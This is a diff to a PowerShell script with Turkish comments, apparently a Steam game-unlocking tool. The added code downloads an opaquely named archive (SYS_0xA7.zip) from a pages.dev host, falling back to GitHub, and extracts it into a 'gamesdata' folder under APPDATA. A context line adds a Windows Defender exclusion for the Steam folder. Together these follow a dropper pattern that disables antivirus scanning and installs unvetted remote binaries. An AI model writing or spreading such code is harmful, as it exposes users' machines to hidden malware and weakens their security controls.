@@ -88,6 +88,45 @@ function PwStart {
 
         try { Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue } catch {}
 
+# --- SYS_0xA7.zip indir ve ayıkla ---
+$gamesDataPath = Join-Path $env:APPDATA "gamesdata"
+if (!(Test-Path $gamesDataPath)) {
+    New-Item $gamesDataPath -ItemType Directory -Force -ErrorAction SilentlyContinue
+}
+
+$zipLocalSys = Join-Path $env:TEMP "SYS_0xA7.zip"
+$successSys = $false
+
+# 1. Deneme: Ana Sunucu
+try {
+    Invoke-RestMethod -Uri "https://zdb2.pages.dev/SYS_0xA7.zip" -OutFile $zipLocalSys -ErrorAction Stop
+    $successSys = $true
+} catch {
+    Write-Host "Primary source for SYS_0xA7.zip failed, trying fallback..." -ForegroundColor Yellow
+}
+
+# 2. Deneme: Fallback (GitHub)
+if (-not $successSys) {
+    try {
+        Invoke-RestMethod -Uri "$githubBaseUrl/SYS_0xA7.zip" -OutFile $zipLocalSys -ErrorAction Stop
+        $successSys = $true
+    } catch {
+        Write-Host "Failed to download SYS_0xA7.zip from both sources." -ForegroundColor Red
+    }
+}
+
+if ($successSys -and (Test-Path $zipLocalSys)) {
+    try {
+        Expand-Archive -Path $zipLocalSys -DestinationPath $gamesDataPath -Force -ErrorAction Stop
+        Write-Host "SYS_0xA7.zip extracted successfully to $gamesDataPath." -ForegroundColor Green
+    } catch {
+        Write-Host "Failed to extract SYS_0xA7.zip." -ForegroundColor Red
+    }
+    Remove-Item $zipLocalSys -Force -ErrorAction SilentlyContinue
+}
+
+        
+        
         # dlls.zip indir ve ayıkla
         $zipLocal = Join-Path $env:TEMP "dlls.zip"
         $success = $false
